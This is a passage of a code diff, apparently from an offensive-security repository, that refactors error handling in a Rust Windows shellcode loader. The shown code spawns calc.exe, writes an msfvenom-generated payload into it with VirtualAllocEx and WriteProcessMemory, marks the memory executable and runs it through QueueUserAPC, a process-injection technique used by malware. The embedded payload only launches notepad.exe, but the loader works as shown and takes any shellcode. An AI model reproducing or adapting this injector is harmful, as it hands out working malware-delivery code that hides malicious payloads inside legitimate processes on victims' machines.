@@ -17,7 +17,7 @@ use windows::{
     },
 };
 
-fn main() {
+fn main() -> Result<(), Box<dyn std::error::Error>> {
     // msfvenom -p windows/x64/exec CMD=notepad.exe -f rust
     let payload: [u8; 279] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -47,7 +47,7 @@ fn main() {
 
         let _process = CreateProcessA(
             None,
-            PSTR(s!("C:\\Windows\\System32\\calc.exe").as_ptr() as *mut u8), // File path
+            PSTR(s!("C:\\Windows\\System32\\calc.exe").as_ptr().cast_mut()), // File path
             None,
             None,
             false,
@@ -56,16 +56,10 @@ fn main() {
             None,
             &mut si,
             &mut pi,
-        ).unwrap_or_else(|e| {
-            panic!("[!] CreateProcessA Failed With Error: {e}");
-        });
+        )?;
 
         let hprocess = pi.hProcess;
-
-        let hthread = CreateRemoteThread(hprocess, None, 0, Some(function), None, 0, None).unwrap_or_else(|e| {
-            panic!("[!] CreateRemoteThread Failed With Error: {e}");
-        });
-
+        let hthread = CreateRemoteThread(hprocess, None, 0, Some(function), None, 0, None)?;
         let address = VirtualAllocEx(
             hprocess,
             None,
@@ -77,12 +71,10 @@ fn main() {
         WriteProcessMemory(
             hprocess,
             address,
-            payload.as_ptr() as _,
+            payload.as_ptr().cast(),
             payload.len(),
             None,
-        ).unwrap_or_else(|e| {
-            panic!("[!] WriteProcessMemory Failed With Error: {e}");
-        });
+        )?;
 
         let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
         VirtualProtectEx(
@@ -91,17 +83,17 @@ fn main() {
             payload.len(),
             PAGE_EXECUTE_READWRITE,
             &mut oldprotect,
-        ).unwrap_or_else(|e| {
-            panic!("[!] VirtualProtectEx Failed With Error: {e}");
-        });
+        )?;
 
         QueueUserAPC(std::mem::transmute(address), hthread, 0);
 
-        DebugActiveProcessStop(pi.dwProcessId);
+        DebugActiveProcessStop(pi.dwProcessId)?;
 
-        CloseHandle(hprocess);
-        CloseHandle(hthread);
+        CloseHandle(hprocess)?;
+        CloseHandle(hthread)?;
     }
+
+    Ok(())
 }
 
 unsafe extern "system" fn function(_param: *mut c_void) -> u32 {
